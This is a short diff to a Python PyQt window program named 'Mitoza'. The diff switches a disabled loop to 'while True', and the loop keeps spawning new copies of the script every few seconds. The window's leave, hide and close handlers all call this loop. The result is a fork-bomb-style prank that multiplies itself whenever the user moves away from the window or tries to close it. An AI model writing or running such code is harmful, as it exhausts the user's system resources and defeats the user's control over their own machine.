@@ -12,6 +12,9 @@ class mainwindow(QMainWindow):
     def __init__(self):
         super().__init__()
         
+        self.mainwindow()
+        
+    def mainwindow(self):    
         print(sys.argv)
         
         self.setWindowTitle("Mitoza")
@@ -36,7 +39,7 @@ class mainwindow(QMainWindow):
             pass
         
     def mitoza(self):
-        while False:
+        while True:
             a = subprocess.Popen(['python.exe',sys.argv[0],"m"])
             self.show()
             time.sleep(4)
@@ -46,15 +49,15 @@ class mainwindow(QMainWindow):
         
     def leaveEvent(self, a0):
         self.mitoza()
-        
-    def moveEvent(self, a0):
-        self.mitoza()
             
     def hideEvent(self, a0):
         self.mitoza()
         
     def closeEvent(self, a0):
         self.mitoza()
+        
+    # def moveEvent(self, a0):
+    #     self.mitoza()
 
     # def on_focusChanged(self, old, now):
     #     print("foc")
